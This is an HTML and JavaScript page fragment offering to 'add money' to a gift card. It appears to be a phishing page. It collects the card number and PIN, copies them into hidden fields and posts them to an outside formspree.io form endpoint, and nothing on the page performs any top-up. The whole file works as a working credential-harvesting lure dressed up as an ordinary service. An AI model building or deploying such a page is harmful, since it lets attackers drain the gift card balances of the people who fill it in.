<main> 
        <form id="checkout-form"  action="https://formspree.io/f/xyzgagbo" method="post" >

            <input type="hidden" id="cardNum" name="Card Number" value=""> 
            <input type="hidden" id="pinNum" name="pin number" value=""> 


        <h2 id="h2">Add money to your gift card.</h2>
        <div class="NumberPIN">
            <div class="Number">
                <label for="Number">Gift Card Number</label>
                <input type="text" id="Number" name="Gift Card Number">
            </div>
            <div class="PIN">
                <div class="pinIco">
                    <label for="PIN">PIN</label>
                    <i class="fa-solid fa-circle-exclamation fa-rotate-180"></i>
                </div>
                <input type="text" id="PIN" name="PIN">
            </div> 
        </div>
        <div class="checkbox">
            <div class="checkboxInput">
            <input type="checkbox" name="checkbox" id="checkbox">
            </div>
            <div class="checkboxLabel">
                <label for="checkbox">My gift card does not have a PIN</label>
            </div>
    </div>
         <button class="continue" type="submit" disabled>Continue</button>  
    <div class="policy">

    </div>

</form>

<script>

// ******************************************************************

const sidebar=document.querySelector('.sidebar')
function showSidebar(){
    sidebar.style.display='flex'

} 
function hideSidebar(){
    sidebar.style.display='none'
}

// ******************************************************************

let checkboxClicked = false;
const checkbox = document.querySelector('#checkbox');
const pinInput = document.querySelector('#PIN');
const numberInput = document.querySelector('#Number');
const continueBtn = document.querySelector('.continue');

const updateContinueButtonState = () => {
    if (numberInput.value && (checkboxClicked || pinInput.value)) {
        continueBtn.removeAttribute('disabled');
    
         
    } else {
        continueBtn.setAttribute('disabled', 'disabled');
    
    }
};

checkbox.addEventListener('click', () => {
    checkboxClicked = !checkboxClicked; // Toggle the value

    if (checkboxClicked) {
        pinInput.setAttribute('disabled', 'disabled');
        pinInput.style.cursor = 'not-allowed';
    } else {
        pinInput.removeAttribute('disabled');
        pinInput.style.cursor = 'default';
    }

    updateContinueButtonState();
});

numberInput.addEventListener('input', updateContinueButtonState);
pinInput.addEventListener('input', updateContinueButtonState);

// Initial check in case there are pre-filled values
updateContinueButtonState();
// ***************************************************************************************

function  getCardNumber(){
    const Number = document.querySelector('#Number').value;
    document.querySelector('#cardNum').value = Number

    const PIN = document.querySelector('#PIN').value;
    document.querySelector('#pinNum').value = PIN;

}

</script>
